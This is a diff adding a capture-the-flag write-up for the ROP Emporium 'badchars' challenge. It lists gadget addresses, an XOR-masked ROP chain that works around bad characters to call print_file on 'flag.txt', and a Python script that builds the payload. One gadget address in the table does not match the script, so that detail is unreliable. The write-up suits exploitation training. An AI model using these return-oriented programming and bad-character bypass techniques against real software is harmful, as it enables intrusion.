@@ -1,0 +1,85 @@
+# badchars
+The challenge is available [here](https://ropemporium.com/challenge/badchars.html).
+
+## Black-Box Test
+
+
+## Solution
+In the following table, the important addresses for constructing the ROP chain are summarized, along with a brief description of each.
+
+| Name          | Type            | Address    | Description                                                       |
+|---------------|-----------------|------------|-------------------------------------------------------------------|
+| print_file    | Func            | 0x080483d0 | The entry address in the PLT table.                               |
+| memory4string | Writable Memory | 0x0804a018 | .data segment addr will be where the string "flag.txt" is placed. |
+| pop_bx        | Gadget          | 0x0804839d | pop ebx; ret;                                                     |
+| pop_bp        | Gadget          | 0x080585bb | pop ebp; ret;                                                     |
+| pop_si_di_bp  | Gadget          | 0x080485b9 | pop esi; pop edi; pop ebp; ret;                                   |
+| mov2memory    | Gadget          | 0x0804854f | mov dword ptr [edi], esi; ret;                                    |
+| xor2memory    | Gadget          | 0x08048547 | xor byte ptr [ebp], bl; ret;                                      |
+
+And the next table describes the ROP chain itself:
+
+| No | Chain Link                                                |
+|----|-----------------------------------------------------------|
+| 1  | 44 garbage bytes                                          |
+| 2  | pop_bx, 0x01010101                                        |
+| 3  | pop_si_di_bp, "fl\x60f", memory4string, memory4string+2   |
+| 4  | mov2memory                                                |
+| 5  | xor2memory                                                |
+| 6  | pop_bp, memory4string+3                                   |
+| 7  | xor2memory                                                |
+| 8  | pop_si_di_bp, "\x2ftyt", memory4string+4, memory4string+4 |
+| 9  | mov2memory                                                |
+| 10 | xor2memory                                                |
+| 11 | pop_bp, memory4string+6                                   |
+| 12 | xor2memory                                                |
+| 13 | print_file, "XXXX", memory4string                         |
+
+Where `"XXXX"` is the return address from the `print_file` function, which is not needed at all (it's there just to ensure that the parameter `memory4string` is in the right place on the stack).
+
+All that remains is to build the Python script that creates the ROP chain, and we’re done!
+
+```python
+# chain_builder.py
+import struct
+
+def little_endian(number):
+    """
+    : The function accepts a number not
+    : exceeding 4 bytes in size and returns it
+    : as a string of hexadecimal characters in : little-endian format.
+    """
+    return struct.pack("<I", number)
+
+# Parts of the chain
+fill_buffer   = b"X"*44
+
+print_file    = little_endian(0x080483d0)
+
+memory4string = 0x0804a018
+
+pop_bx        = little_endian(0x0804839d)
+pop_bp        = little_endian(0x080485bb)
+pop_si_di_bp  = little_endian(0x080485b9)
+mov2memory    = little_endian(0x0804854f)
+xor2memory    = little_endian(0x08048547) 
+
+# Building the chain
+ROP_Chain = fill_buffer
+ROP_Chain += pop_bx + b"\x01\x01\x01\x01"
+ROP_Chain += pop_si_di_bp + b"fl\x60f" + little_endian(memory4string) + little_endian(memory4string+2)
+ROP_Chain += mov2memory
+ROP_Chain += xor2memory
+ROP_Chain += pop_bp + little_endian(memory4string+3)
+ROP_Chain += xor2memory
+ROP_Chain += pop_si_di_bp + b"\x2ftyt" + little_endian(memory4string+4) + little_endian(memory4string+4)
+ROP_Chain += mov2memory
+ROP_Chain += xor2memory
+ROP_Chain += pop_bp + little_endian(memory4string+6)
+ROP_Chain += xor2memory
+ROP_Chain += print_file + b"XXXX" + little_endian(memory4string)
+
+# Saving the chain in a binary file
+with open("rop_chain", "wb") as f:
+    f.write(ROP_Chain)
+```
